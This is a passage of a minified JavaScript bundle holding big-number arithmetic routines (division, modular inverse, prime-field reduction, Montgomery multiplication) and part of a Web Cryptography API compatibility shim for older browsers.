                o = 0 | i.words[i.length - 1],
                a = this._countBits(o);
              ((r = 26 - a),
                0 !== r &&
                  ((i = i.ushln(r)),
                  n.iushln(r),
                  (o = 0 | i.words[i.length - 1])));
              var l,
                h = n.length - i.length;
              if ("mod" !== e) {
                ((l = new s(null)),
                  (l.length = h + 1),
                  (l.words = new Array(l.length)));
                for (var c = 0; c < l.length; c++) l.words[c] = 0;
              }
              var u = n.clone()._ishlnsubmul(i, 1, h);
              0 === u.negative && ((n = u), l && (l.words[h] = 1));
              for (var d = h - 1; d >= 0; d--) {
                var f =
                  67108864 * (0 | n.words[i.length + d]) +
                  (0 | n.words[i.length + d - 1]);
                ((f = Math.min((f / o) | 0, 67108863)),
                  n._ishlnsubmul(i, f, d));
                while (0 !== n.negative)
                  (f--,
                    (n.negative = 0),
                    n._ishlnsubmul(i, 1, d),
                    n.isZero() || (n.negative ^= 1));
                l && (l.words[d] = f);
              }
              return (
                l && l._strip(),
                n._strip(),
                "div" !== e && 0 !== r && n.iushrn(r),
                { div: l || null, mod: n }
              );
            }),
            (s.prototype.divmod = function (t, e, r) {
              return (
                n(!t.isZero()),
                this.isZero()
                  ? { div: new s(0), mod: new s(0) }
                  : 0 !== this.negative && 0 === t.negative
                    ? ((a = this.neg().divmod(t, e)),
                      "mod" !== e && (i = a.div.neg()),
                      "div" !== e &&
                        ((o = a.mod.neg()), r && 0 !== o.negative && o.iadd(t)),
                      { div: i, mod: o })
                    : 0 === this.negative && 0 !== t.negative
                      ? ((a = this.divmod(t.neg(), e)),
                        "mod" !== e && (i = a.div.neg()),
                        { div: i, mod: a.mod })
                      : 0 !== (this.negative & t.negative)
                        ? ((a = this.neg().divmod(t.neg(), e)),
                          "div" !== e &&
                            ((o = a.mod.neg()),
                            r && 0 !== o.negative && o.isub(t)),
                          { div: a.div, mod: o })
                        : t.length > this.length || this.cmp(t) < 0
                          ? { div: new s(0), mod: this }
                          : 1 === t.length
                            ? "div" === e
                              ? { div: this.divn(t.words[0]), mod: null }
                              : "mod" === e
                                ? {
                                    div: null,
                                    mod: new s(this.modrn(t.words[0])),
                                  }
                                : {
                                    div: this.divn(t.words[0]),
                                    mod: new s(this.modrn(t.words[0])),
                                  }
                            : this._wordDiv(t, e)
              );
              var i, o, a;
            }),
            (s.prototype.div = function (t) {
              return this.divmod(t, "div", !1).div;
            }),
            (s.prototype.mod = function (t) {
              return this.divmod(t, "mod", !1).mod;
            }),
            (s.prototype.umod = function (t) {
              return this.divmod(t, "mod", !0).mod;
            }),
            (s.prototype.divRound = function (t) {
              var e = this.divmod(t);
              if (e.mod.isZero()) return e.div;
              var r = 0 !== e.div.negative ? e.mod.isub(t) : e.mod,
                n = t.ushrn(1),
                i = t.andln(1),
                s = r.cmp(n);
              return s < 0 || (1 === i && 0 === s)
                ? e.div
                : 0 !== e.div.negative
                  ? e.div.isubn(1)
                  : e.div.iaddn(1);
            }),
            (s.prototype.modrn = function (t) {
              var e = t < 0;
              (e && (t = -t), n(t <= 67108863));
              for (
                var r = (1 << 26) % t, i = 0, s = this.length - 1;
                s >= 0;
                s--
              )
                i = (r * i + (0 | this.words[s])) % t;
              return e ? -i : i;
            }),
            (s.prototype.modn = function (t) {
              return this.modrn(t);
            }),
            (s.prototype.idivn = function (t) {
              var e = t < 0;
              (e && (t = -t), n(t <= 67108863));
              for (var r = 0, i = this.length - 1; i >= 0; i--) {
                var s = (0 | this.words[i]) + 67108864 * r;
                ((this.words[i] = (s / t) | 0), (r = s % t));
              }
              return (this._strip(), e ? this.ineg() : this);
            }),
            (s.prototype.divn = function (t) {
              return this.clone().idivn(t);
            }),
            (s.prototype.egcd = function (t) {
              (n(0 === t.negative), n(!t.isZero()));
              var e = this,
                r = t.clone();
              e = 0 !== e.negative ? e.umod(t) : e.clone();
              var i = new s(1),
                o = new s(0),
                a = new s(0),
                l = new s(1),
                h = 0;
              while (e.isEven() && r.isEven()) (e.iushrn(1), r.iushrn(1), ++h);
              var c = r.clone(),
                u = e.clone();
              while (!e.isZero()) {
                for (
                  var d = 0, f = 1;
                  0 === (e.words[0] & f) && d < 26;
                  ++d, f <<= 1
                );
                if (d > 0) {
                  e.iushrn(d);
                  while (d-- > 0)
                    ((i.isOdd() || o.isOdd()) && (i.iadd(c), o.isub(u)),
                      i.iushrn(1),
                      o.iushrn(1));
                }
                for (
                  var p = 0, w = 1;
                  0 === (r.words[0] & w) && p < 26;
                  ++p, w <<= 1
                );
                if (p > 0) {
                  r.iushrn(p);
                  while (p-- > 0)
                    ((a.isOdd() || l.isOdd()) && (a.iadd(c), l.isub(u)),
                      a.iushrn(1),
                      l.iushrn(1));
                }
                e.cmp(r) >= 0
                  ? (e.isub(r), i.isub(a), o.isub(l))
                  : (r.isub(e), a.isub(i), l.isub(o));
              }
              return { a: a, b: l, gcd: r.iushln(h) };
            }),
            (s.prototype._invmp = function (t) {
              (n(0 === t.negative), n(!t.isZero()));
              var e = this,
                r = t.clone();
              e = 0 !== e.negative ? e.umod(t) : e.clone();
              var i,
                o = new s(1),
                a = new s(0),
                l = r.clone();
              while (e.cmpn(1) > 0 && r.cmpn(1) > 0) {
                for (
                  var h = 0, c = 1;
                  0 === (e.words[0] & c) && h < 26;
                  ++h, c <<= 1
                );
                if (h > 0) {
                  e.iushrn(h);
                  while (h-- > 0) (o.isOdd() && o.iadd(l), o.iushrn(1));
                }
                for (
                  var u = 0, d = 1;
                  0 === (r.words[0] & d) && u < 26;
                  ++u, d <<= 1
                );
                if (u > 0) {
                  r.iushrn(u);
                  while (u-- > 0) (a.isOdd() && a.iadd(l), a.iushrn(1));
                }
                e.cmp(r) >= 0 ? (e.isub(r), o.isub(a)) : (r.isub(e), a.isub(o));
              }
              return (
                (i = 0 === e.cmpn(1) ? o : a),
                i.cmpn(0) < 0 && i.iadd(t),
                i
              );
            }),
            (s.prototype.gcd = function (t) {
              if (this.isZero()) return t.abs();
              if (t.isZero()) return this.abs();
              var e = this.clone(),
                r = t.clone();
              ((e.negative = 0), (r.negative = 0));
              for (var n = 0; e.isEven() && r.isEven(); n++)
                (e.iushrn(1), r.iushrn(1));
              do {
                while (e.isEven()) e.iushrn(1);
                while (r.isEven()) r.iushrn(1);
                var i = e.cmp(r);
                if (i < 0) {
                  var s = e;
                  ((e = r), (r = s));
                } else if (0 === i || 0 === r.cmpn(1)) break;
                e.isub(r);
              } while (1);
              return r.iushln(n);
            }),
            (s.prototype.invm = function (t) {
              return this.egcd(t).a.umod(t);
            }),
            (s.prototype.isEven = function () {
              return 0 === (1 & this.words[0]);
            }),
            (s.prototype.isOdd = function () {
              return 1 === (1 & this.words[0]);
            }),
            (s.prototype.andln = function (t) {
              return this.words[0] & t;
            }),
            (s.prototype.bincn = function (t) {
              n("number" === typeof t);
              var e = t % 26,
                r = (t - e) / 26,
                i = 1 << e;
              if (this.length <= r)
                return (this._expand(r + 1), (this.words[r] |= i), this);
              for (var s = i, o = r; 0 !== s && o < this.length; o++) {
                var a = 0 | this.words[o];
                ((a += s),
                  (s = a >>> 26),
                  (a &= 67108863),
                  (this.words[o] = a));
              }
              return (0 !== s && ((this.words[o] = s), this.length++), this);
            }),
            (s.prototype.isZero = function () {
              return 1 === this.length && 0 === this.words[0];
            }),
            (s.prototype.cmpn = function (t) {
              var e,
                r = t < 0;
              if (0 !== this.negative && !r) return -1;
              if (0 === this.negative && r) return 1;
              if ((this._strip(), this.length > 1)) e = 1;
              else {
                (r && (t = -t), n(t <= 67108863, "Number is too big"));
                var i = 0 | this.words[0];
                e = i === t ? 0 : i < t ? -1 : 1;
              }
              return 0 !== this.negative ? 0 | -e : e;
            }),
            (s.prototype.cmp = function (t) {
              if (0 !== this.negative && 0 === t.negative) return -1;
              if (0 === this.negative && 0 !== t.negative) return 1;
              var e = this.ucmp(t);
              return 0 !== this.negative ? 0 | -e : e;
            }),
            (s.prototype.ucmp = function (t) {
              if (this.length > t.length) return 1;
              if (this.length < t.length) return -1;
              for (var e = 0, r = this.length - 1; r >= 0; r--) {
                var n = 0 | this.words[r],
                  i = 0 | t.words[r];
                if (n !== i) {
                  n < i ? (e = -1) : n > i && (e = 1);
                  break;
                }
              }
              return e;
            }),
            (s.prototype.gtn = function (t) {
              return 1 === this.cmpn(t);
            }),
            (s.prototype.gt = function (t) {
              return 1 === this.cmp(t);
            }),
            (s.prototype.gten = function (t) {
              return this.cmpn(t) >= 0;
            }),
            (s.prototype.gte = function (t) {
              return this.cmp(t) >= 0;
            }),
            (s.prototype.ltn = function (t) {
              return -1 === this.cmpn(t);
            }),
            (s.prototype.lt = function (t) {
              return -1 === this.cmp(t);
            }),
            (s.prototype.lten = function (t) {
              return this.cmpn(t) <= 0;
            }),
            (s.prototype.lte = function (t) {
              return this.cmp(t) <= 0;
            }),
            (s.prototype.eqn = function (t) {
              return 0 === this.cmpn(t);
            }),
            (s.prototype.eq = function (t) {
              return 0 === this.cmp(t);
            }),
            (s.red = function (t) {
              return new M(t);
            }),
            (s.prototype.toRed = function (t) {
              return (
                n(!this.red, "Already a number in reduction context"),
                n(0 === this.negative, "red works only with positives"),
                t.convertTo(this)._forceRed(t)
              );
            }),
            (s.prototype.fromRed = function () {
              return (
                n(
                  this.red,
                  "fromRed works only with numbers in reduction context",
                ),
                this.red.convertFrom(this)
              );
            }),
            (s.prototype._forceRed = function (t) {
              return ((this.red = t), this);
            }),
            (s.prototype.forceRed = function (t) {
              return (
                n(!this.red, "Already a number in reduction context"),
                this._forceRed(t)
              );
            }),
            (s.prototype.redAdd = function (t) {
              return (
                n(this.red, "redAdd works only with red numbers"),
                this.red.add(this, t)
              );
            }),
            (s.prototype.redIAdd = function (t) {
              return (
                n(this.red, "redIAdd works only with red numbers"),
                this.red.iadd(this, t)
              );
            }),
            (s.prototype.redSub = function (t) {
              return (
                n(this.red, "redSub works only with red numbers"),
                this.red.sub(this, t)
              );
            }),
            (s.prototype.redISub = function (t) {
              return (
                n(this.red, "redISub works only with red numbers"),
                this.red.isub(this, t)
              );
            }),
            (s.prototype.redShl = function (t) {
              return (
                n(this.red, "redShl works only with red numbers"),
                this.red.shl(this, t)
              );
            }),
            (s.prototype.redMul = function (t) {
              return (
                n(this.red, "redMul works only with red numbers"),
                this.red._verify2(this, t),
                this.red.mul(this, t)
              );
            }),
            (s.prototype.redIMul = function (t) {
              return (
                n(this.red, "redMul works only with red numbers"),
                this.red._verify2(this, t),
                this.red.imul(this, t)
              );
            }),
            (s.prototype.redSqr = function () {
              return (
                n(this.red, "redSqr works only with red numbers"),
                this.red._verify1(this),
                this.red.sqr(this)
              );
            }),
            (s.prototype.redISqr = function () {
              return (
                n(this.red, "redISqr works only with red numbers"),
                this.red._verify1(this),
                this.red.isqr(this)
              );
            }),
            (s.prototype.redSqrt = function () {
              return (
                n(this.red, "redSqrt works only with red numbers"),
                this.red._verify1(this),
                this.red.sqrt(this)
              );
            }),
            (s.prototype.redInvm = function () {
              return (
                n(this.red, "redInvm works only with red numbers"),
                this.red._verify1(this),
                this.red.invm(this)
              );
            }),
            (s.prototype.redNeg = function () {
              return (
                n(this.red, "redNeg works only with red numbers"),
                this.red._verify1(this),
                this.red.neg(this)
              );
            }),
            (s.prototype.redPow = function (t) {
              return (
                n(this.red && !t.red, "redPow(normalNum)"),
                this.red._verify1(this),
                this.red.pow(this, t)
              );
            }));
          var A = { k256: null, p224: null, p192: null, p25519: null };
          function F(t, e) {
            ((this.name = t),
              (this.p = new s(e, 16)),
              (this.n = this.p.bitLength()),
              (this.k = new s(1).iushln(this.n).isub(this.p)),
              (this.tmp = this._tmp()));
          }
          function E() {
            F.call(
              this,
              "k256",
              "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f",
            );
          }
          function b() {
            F.call(
              this,
              "p224",
              "ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001",
            );
          }
          function v() {
            F.call(
              this,
              "p192",
              "ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff",
            );
          }
          function D() {
            F.call(
              this,
              "25519",
              "7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed",
            );
          }
          function M(t) {
            if ("string" === typeof t) {
              var e = s._prime(t);
              ((this.m = e.p), (this.prime = e));
            } else
              (n(t.gtn(1), "modulus must be greater than 1"),
                (this.m = t),
                (this.prime = null));
          }
          function _(t) {
            (M.call(this, t),
              (this.shift = this.m.bitLength()),
              this.shift % 26 !== 0 && (this.shift += 26 - (this.shift % 26)),
              (this.r = new s(1).iushln(this.shift)),
              (this.r2 = this.imod(this.r.sqr())),
              (this.rinv = this.r._invmp(this.m)),
              (this.minv = this.rinv.mul(this.r).isubn(1).div(this.m)),
              (this.minv = this.minv.umod(this.r)),
              (this.minv = this.r.sub(this.minv)));
          }
          ((F.prototype._tmp = function () {
            var t = new s(null);
            return ((t.words = new Array(Math.ceil(this.n / 13))), t);
          }),
            (F.prototype.ireduce = function (t) {
              var e,
                r = t;
              do {
                (this.split(r, this.tmp),
                  (r = this.imulK(r)),
                  (r = r.iadd(this.tmp)),
                  (e = r.bitLength()));
              } while (e > this.n);
              var n = e < this.n ? -1 : r.ucmp(this.p);
              return (
                0 === n
                  ? ((r.words[0] = 0), (r.length = 1))
                  : n > 0
                    ? r.isub(this.p)
                    : r._strip(),
                r
              );
            }),
            (F.prototype.split = function (t, e) {
              t.iushrn(this.n, 0, e);
            }),
            (F.prototype.imulK = function (t) {
              return t.imul(this.k);
            }),
            i(E, F),
            (E.prototype.split = function (t, e) {
              for (
                var r = 4194303, n = Math.min(t.length, 9), i = 0;
                i < n;
                i++
              )
                e.words[i] = t.words[i];
              if (((e.length = n), t.length <= 9))
                return ((t.words[0] = 0), void (t.length = 1));
              var s = t.words[9];
              for (e.words[e.length++] = s & r, i = 10; i < t.length; i++) {
                var o = 0 | t.words[i];
                ((t.words[i - 10] = ((o & r) << 4) | (s >>> 22)), (s = o));
              }
              ((s >>>= 22),
                (t.words[i - 10] = s),
                0 === s && t.length > 10 ? (t.length -= 10) : (t.length -= 9));
            }),
            (E.prototype.imulK = function (t) {
              ((t.words[t.length] = 0),
                (t.words[t.length + 1] = 0),
                (t.length += 2));
              for (var e = 0, r = 0; r < t.length; r++) {
                var n = 0 | t.words[r];
                ((e += 977 * n),
                  (t.words[r] = 67108863 & e),
                  (e = 64 * n + ((e / 67108864) | 0)));
              }
              return (
                0 === t.words[t.length - 1] &&
                  (t.length--, 0 === t.words[t.length - 1] && t.length--),
                t
              );
            }),
            i(b, F),
            i(v, F),
            i(D, F),
            (D.prototype.imulK = function (t) {
              for (var e = 0, r = 0; r < t.length; r++) {
                var n = 19 * (0 | t.words[r]) + e,
                  i = 67108863 & n;
                ((n >>>= 26), (t.words[r] = i), (e = n));
              }
              return (0 !== e && (t.words[t.length++] = e), t);
            }),
            (s._prime = function (t) {
              if (A[t]) return A[t];
              var e;
              if ("k256" === t) e = new E();
              else if ("p224" === t) e = new b();
              else if ("p192" === t) e = new v();
              else {
                if ("p25519" !== t) throw new Error("Unknown prime " + t);
                e = new D();
              }
              return ((A[t] = e), e);
            }),
            (M.prototype._verify1 = function (t) {
              (n(0 === t.negative, "red works only with positives"),
                n(t.red, "red works only with red numbers"));
            }),
            (M.prototype._verify2 = function (t, e) {
              (n(
                0 === (t.negative | e.negative),
                "red works only with positives",
              ),
                n(t.red && t.red === e.red, "red works only with red numbers"));
            }),
            (M.prototype.imod = function (t) {
              return this.prime
                ? this.prime.ireduce(t)._forceRed(this)
                : (h(t, t.umod(this.m)._forceRed(this)), t);
            }),
            (M.prototype.neg = function (t) {
              return t.isZero() ? t.clone() : this.m.sub(t)._forceRed(this);
            }),
            (M.prototype.add = function (t, e) {
              this._verify2(t, e);
              var r = t.add(e);
              return (r.cmp(this.m) >= 0 && r.isub(this.m), r._forceRed(this));
            }),
            (M.prototype.iadd = function (t, e) {
              this._verify2(t, e);
              var r = t.iadd(e);
              return (r.cmp(this.m) >= 0 && r.isub(this.m), r);
            }),
            (M.prototype.sub = function (t, e) {
              this._verify2(t, e);
              var r = t.sub(e);
              return (r.cmpn(0) < 0 && r.iadd(this.m), r._forceRed(this));
            }),
            (M.prototype.isub = function (t, e) {
              this._verify2(t, e);
              var r = t.isub(e);
              return (r.cmpn(0) < 0 && r.iadd(this.m), r);
            }),
            (M.prototype.shl = function (t, e) {
              return (this._verify1(t), this.imod(t.ushln(e)));
            }),
            (M.prototype.imul = function (t, e) {
              return (this._verify2(t, e), this.imod(t.imul(e)));
            }),
            (M.prototype.mul = function (t, e) {
              return (this._verify2(t, e), this.imod(t.mul(e)));
            }),
            (M.prototype.isqr = function (t) {
              return this.imul(t, t.clone());
            }),
            (M.prototype.sqr = function (t) {
              return this.mul(t, t);
            }),
            (M.prototype.sqrt = function (t) {
              if (t.isZero()) return t.clone();
              var e = this.m.andln(3);
              if ((n(e % 2 === 1), 3 === e)) {
                var r = this.m.add(new s(1)).iushrn(2);
                return this.pow(t, r);
              }
              var i = this.m.subn(1),
                o = 0;
              while (!i.isZero() && 0 === i.andln(1)) (o++, i.iushrn(1));
              n(!i.isZero());
              var a = new s(1).toRed(this),
                l = a.redNeg(),
                h = this.m.subn(1).iushrn(1),
                c = this.m.bitLength();
              c = new s(2 * c * c).toRed(this);
              while (0 !== this.pow(c, h).cmp(l)) c.redIAdd(l);
              var u = this.pow(c, i),
                d = this.pow(t, i.addn(1).iushrn(1)),
                f = this.pow(t, i),
                p = o;
              while (0 !== f.cmp(a)) {
                for (var w = f, C = 0; 0 !== w.cmp(a); C++) w = w.redSqr();
                n(C < p);
                var g = this.pow(u, new s(1).iushln(p - C - 1));
                ((d = d.redMul(g)),
                  (u = g.redSqr()),
                  (f = f.redMul(u)),
                  (p = C));
              }
              return d;
            }),
            (M.prototype.invm = function (t) {
              var e = t._invmp(this.m);
              return 0 !== e.negative
                ? ((e.negative = 0), this.imod(e).redNeg())
                : this.imod(e);
            }),
            (M.prototype.pow = function (t, e) {
              if (e.isZero()) return new s(1).toRed(this);
              if (0 === e.cmpn(1)) return t.clone();
              var r = 4,
                n = new Array(1 << r);
              ((n[0] = new s(1).toRed(this)), (n[1] = t));
              for (var i = 2; i < n.length; i++) n[i] = this.mul(n[i - 1], t);
              var o = n[0],
                a = 0,
                l = 0,
                h = e.bitLength() % 26;
              for (0 === h && (h = 26), i = e.length - 1; i >= 0; i--) {
                for (var c = e.words[i], u = h - 1; u >= 0; u--) {
                  var d = (c >> u) & 1;
                  (o !== n[0] && (o = this.sqr(o)),
                    0 !== d || 0 !== a
                      ? ((a <<= 1),
                        (a |= d),
                        l++,
                        (l === r || (0 === i && 0 === u)) &&
                          ((o = this.mul(o, n[a])), (l = 0), (a = 0)))
                      : (l = 0));
                }
                h = 26;
              }
              return o;
            }),
            (M.prototype.convertTo = function (t) {
              var e = t.umod(this.m);
              return e === t ? e.clone() : e;
            }),
            (M.prototype.convertFrom = function (t) {
              var e = t.clone();
              return ((e.red = null), e);
            }),
            (s.mont = function (t) {
              return new _(t);
            }),
            i(_, M),
            (_.prototype.convertTo = function (t) {
              return this.imod(t.ushln(this.shift));
            }),
            (_.prototype.convertFrom = function (t) {
              var e = this.imod(t.mul(this.rinv));
              return ((e.red = null), e);
            }),
            (_.prototype.imul = function (t, e) {
              if (t.isZero() || e.isZero())
                return ((t.words[0] = 0), (t.length = 1), t);
              var r = t.imul(e),
                n = r
                  .maskn(this.shift)
                  .mul(this.minv)
                  .imaskn(this.shift)
                  .mul(this.m),
                i = r.isub(n).iushrn(this.shift),
                s = i;
              return (
                i.cmp(this.m) >= 0
                  ? (s = i.isub(this.m))
                  : i.cmpn(0) < 0 && (s = i.iadd(this.m)),
                s._forceRed(this)
              );
            }),
            (_.prototype.mul = function (t, e) {
              if (t.isZero() || e.isZero()) return new s(0)._forceRed(this);
              var r = t.mul(e),
                n = r
                  .maskn(this.shift)
                  .mul(this.minv)
                  .imaskn(this.shift)
                  .mul(this.m),
                i = r.isub(n).iushrn(this.shift),
                o = i;
              return (
                i.cmp(this.m) >= 0
                  ? (o = i.isub(this.m))
                  : i.cmpn(0) < 0 && (o = i.iadd(this.m)),
                o._forceRed(this)
              );
            }),
            (_.prototype.invm = function (t) {
              var e = this.imod(t._invmp(this.m).mul(this.r2));
              return e._forceRed(this);
            }));
        })(t, this);
      }).call(this, r(20)(t));
    },
    8147: function (t, e, r) {
      "use strict";
      (Object.defineProperty(e, "__esModule", { value: !0 }),
        (e.default = void 0),
        r(8148));
      e.default = window.crypto;
    },
    8148: function (t, e, r) {
      "use strict";
      var n, i;
      (Object.defineProperty(e, "__esModule", { value: !0 }),
        (e.default = void 0),
        /**
         * @file Web Cryptography API shim
         * @author Artem S Vybornov <vybornov@gmail.com>
         * @license MIT
         */
        (function (r, s) {
          ((n = []),
            (i = function () {
              return s(r);
            }.apply(e, n)),
            void 0 === i || (t.exports = i));
        })("undefined" !== typeof self ? self : void 0, function (t) {
          if ("function" !== typeof Promise) throw "Promise support required";
          var e = t.crypto || t.msCrypto;
          if (e) {
            var r = e.subtle || e.webkitSubtle;
            if (r) {
              var n = t.Crypto || e.constructor || Object,
                i = t.SubtleCrypto || r.constructor || Object,
                s =
                  (t.CryptoKey || t.Key,
                  t.navigator.userAgent.indexOf("Edge/") > -1),
                o = !!t.msCrypto && !s,
                a = !e.subtle && !!e.webkitSubtle;
              if (o || a) {
                var l = { KoZIhvcNAQEB: "1.2.840.113549.1.1.1" },
                  h = { "1.2.840.113549.1.1.1": "KoZIhvcNAQEB" };
                if (
                  (["generateKey", "importKey", "unwrapKey"].forEach(
                    function (t) {
                      var n = r[t];
                      r[t] = function (i, s, l) {
                        var h,
                          c,
                          u,
                          p,
                          B = [].slice.call(arguments);
                        switch (t) {
                          case "generateKey":
                            ((h = w(i)), (c = s), (u = l));
                            break;
                          case "importKey":
                            ((h = w(l)),
                              (c = B[3]),
                              (u = B[4]),
                              "jwk" === i &&
                                ((s = g(s)),
                                s.alg || (s.alg = C(h)),
                                s.key_ops ||
                                  (s.key_ops =
                                    "oct" !== s.kty
                                      ? "d" in s
                                        ? u.filter(v)
                                        : u.filter(b)
                                      : u.slice()),
                                (B[1] = y(s))));
                            break;
                          case "unwrapKey":
                            ((h = B[4]),
                              (c = B[5]),
                              (u = B[6]),
                              (B[2] = l._key));
                            break;
                        }
                        if ("generateKey" === t && "HMAC" === h.name && h.hash)
                          return (
                            (h.length =
                              h.length ||
                              {
                                "SHA-1": 512,
                                "SHA-256": 512,
                                "SHA-384": 1024,
                                "SHA-512": 1024,
                              }[h.hash.name]),
                            r.importKey(
                              "raw",
                              e.getRandomValues(
                                new Uint8Array((h.length + 7) >> 3),
                              ),
                              h,
                              c,
                              u,
                            )
                          );
                        if (
                          a &&
                          "generateKey" === t &&
                          "RSASSA-PKCS1-v1_5" === h.name &&
                          (!h.modulusLength || h.modulusLength >= 2048)
                        )
                          return (
                            (i = w(i)),
                            (i.name = "RSAES-PKCS1-v1_5"),
                            delete i.hash,
                            r
                              .generateKey(i, !0, ["encrypt", "decrypt"])
                              .then(function (t) {
                                return Promise.all([
                                  r.exportKey("jwk", t.publicKey),
                                  r.exportKey("jwk", t.privateKey),
                                ]);
                              })
                              .then(function (t) {
                                return (
                                  (t[0].alg = t[1].alg = C(h)),
                                  (t[0].key_ops = u.filter(b)),
                                  (t[1].key_ops = u.filter(v)),
                                  Promise.all([
                                    r.importKey(
                                      "jwk",
                                      t[0],
                                      h,
                                      !0,
                                      t[0].key_ops,
                                    ),
                                    r.importKey(
                                      "jwk",
                                      t[1],
                                      h,
                                      c,
                                      t[1].key_ops,
                                    ),
                                  ])
                                );
                              })
                              .then(function (t) {
                                return { publicKey: t[0], privateKey: t[1] };
                              })
                          );
                        if (
                          (a || (o && "SHA-1" === (h.hash || {}).name)) &&
                          "importKey" === t &&
                          "jwk" === i &&
                          "HMAC" === h.name &&
                          "oct" === s.kty
                        )
                          return r.importKey("raw", f(d(s.k)), l, B[3], B[4]);
                        if (
                          a &&
                          "importKey" === t &&
                          ("spki" === i || "pkcs8" === i)
                        )
                          return r.importKey("jwk", m(s), l, B[3], B[4]);
                        if (o && "unwrapKey" === t)
                          return r.decrypt(B[3], l, s).then(function (t) {
                            return r.importKey(i, t, B[4], B[5], B[6]);
                          });
                        try {
                          p = n.apply(r, B);
                        } catch (A) {
                          return Promise.reject(A);
                        }
                        return (
                          o &&
                            (p = new Promise(function (t, e) {
                              ((p.onabort = p.onerror =
                                function (t) {
                                  e(t);
                                }),
                                (p.oncomplete = function (e) {
                                  t(e.target.result);
                                }));
                            })),
                          (p = p.then(function (t) {
                            return (
                              "HMAC" === h.name &&
                                (h.length ||
                                  (h.length = 8 * t.algorithm.length)),
                              0 == h.name.search("RSA") &&
                                (h.modulusLength ||
                                  (h.modulusLength = (
                                    t.publicKey || t
                                  ).algorithm.modulusLength),
                                h.publicExponent ||
                                  (h.publicExponent = (
                                    t.publicKey || t
                                  ).algorithm.publicExponent)),
                              (t =
                                t.publicKey && t.privateKey
                                  ? {
                                      publicKey: new E(
                                        t.publicKey,
                                        h,
                                        c,
                                        u.filter(b),
                                      ),
                                      privateKey: new E(
                                        t.privateKey,
                                        h,
                                        c,
                                        u.filter(v),
                                      ),
                                    }
                                  : new E(t, h, c, u)),
                              t
                            );
                          })),
                          p
                        );
                      };
                    },
                  ),
                  ["exportKey", "wrapKey"].forEach(function (t) {
                    var e = r[t];
                    r[t] = function (n, i, s) {
                      var l,
                        h = [].slice.call(arguments);
                      switch (t) {
                        case "exportKey":
                          h[1] = i._key;
                          break;
                        case "wrapKey":
                          ((h[1] = i._key), (h[2] = s._key));
                          break;
                      }
                      if (
                        ((a ||
                          (o && "SHA-1" === (i.algorithm.hash || {}).name)) &&
                          "exportKey" === t &&
                          "jwk" === n &&
                          "HMAC" === i.algorithm.name &&
                          (h[0] = "raw"),
                        !a ||
                          "exportKey" !== t ||
                          ("spki" !== n && "pkcs8" !== n) ||
                          (h[0] = "jwk"),
                        o && "wrapKey" === t)
                      )
                        return r.exportKey(n, i).then(function (t) {
                          return (
                            "jwk" === n &&
                              (t = f(
                                unescape(
                                  encodeURIComponent(JSON.stringify(g(t))),
                                ),
                              )),
                            r.encrypt(h[3], s, t)
                          );
                        });
                      try {
                        l = e.apply(r, h);
                      } catch (c) {
                        return Promise.reject(c);
                      }
                      return (
                        o &&
                          (l = new Promise(function (t, e) {
                            ((l.onabort = l.onerror =
                              function (t) {
                                e(t);
                              }),
                              (l.oncomplete = function (e) {
                                t(e.target.result);
                              }));
                          })),
                        "exportKey" === t &&
                          "jwk" === n &&
                          (l = l.then(function (t) {
                            return (a ||
                              (o &&
                                "SHA-1" === (i.algorithm.hash || {}).name)) &&
                              "HMAC" === i.algorithm.name
                              ? {
                                  kty: "oct",
                                  alg: C(i.algorithm),
                                  key_ops: i.usages.slice(),
                                  ext: !0,
                                  k: u(p(t)),
                                }
                              : ((t = g(t)),
                                t.alg || (t["alg"] = C(i.algorithm)),
                                t.key_ops ||
                                  (t["key_ops"] =
                                    "public" === i.type
                                      ? i.usages.filter(b)
                                      : "private" === i.type
                                        ? i.usages.filter(v)
                                        : i.usages.slice()),
                                t);
                          })),
                        !a ||
                          "exportKey" !== t ||
                          ("spki" !== n && "pkcs8" !== n) ||
                          (l = l.then(function (t) {
                            return ((t = B(g(t))), t);
                          })),
                        l
                      );
                    };
                  }),
                  ["encrypt", "decrypt", "sign", "verify"].forEach(
                    function (t) {
                      var e = r[t];
                      r[t] = function (n, i, s, a) {
                        if (o && (!s.byteLength || (a && !a.byteLength)))
                          throw new Error("Empy input is not allowed");
                        var l,
                          h = [].slice.call(arguments),
                          c = w(n);
                        if (o && "decrypt" === t && "AES-GCM" === c.name) {
                          var u = n.tagLength >> 3;
                          ((h[2] = (s.buffer || s).slice(0, s.byteLength - u)),
                            (n.tag = (s.buffer || s).slice(s.byteLength - u)));
                        }
                        h[1] = i._key;
                        try {
                          l = e.apply(r, h);
                        } catch (d) {
                          return Promise.reject(d);
                        }
                        return (
                          o &&
                            (l = new Promise(function (e, r) {
                              ((l.onabort = l.onerror =
                                function (t) {
                                  r(t);
                                }),
                                (l.oncomplete = function (r) {
                                  r = r.target.result;
                                  if (
                                    "encrypt" === t &&
                                    r instanceof AesGcmEncryptResult
                                  ) {
                                    var n = r.ciphertext,
                                      i = r.tag;
                                    ((r = new Uint8Array(
                                      n.byteLength + i.byteLength,
                                    )),
                                      r.set(new Uint8Array(n), 0),
                                      r.set(new Uint8Array(i), n.byteLength),
                                      (r = r.buffer));
                                  }
                                  e(r);
                                }));
                            })),
                          l
                        );
                      };
                    },
                  ),
                  o)
                ) {
                  var c = r.digest;
                  ((r["digest"] = function (t, e) {
                    if (!e.byteLength)
                      throw new Error("Empy input is not allowed");
                    var n;
                    try {
                      n = c.call(r, t, e);
                    } catch (i) {
                      return Promise.reject(i);
                    }
                    return (
                      (n = new Promise(function (t, e) {
                        ((n.onabort = n.onerror =
                          function (t) {
                            e(t);
                          }),
                          (n.oncomplete = function (e) {
                            t(e.target.result);
                          }));
                      })),
                      n
                    );
                  }),
                    (t.crypto = Object.create(e, {
                      getRandomValues: {
                        value: function (t) {
                          return e.getRandomValues(t);
                        },
                      },
                      subtle: { value: r },
                    })),
                    (t.CryptoKey = E));
                }
                a &&
                  ((e.subtle = r),
                  (t.Crypto = n),
                  (t.SubtleCrypto = i),
                  (t.CryptoKey = E));
              }
            }
          }
          function u(t) {
            return btoa(t)
              .replace(/\=+$/, "")
              .replace(/\+/g, "-")
              .replace(/\//g, "_");
          }
          function d(t) {
            return (
              (t += "==="),
              (t = t.slice(0, -t.length % 4)),
              atob(t.replace(/-/g, "+").replace(/_/g, "/"))
            );
          }
          function f(t) {
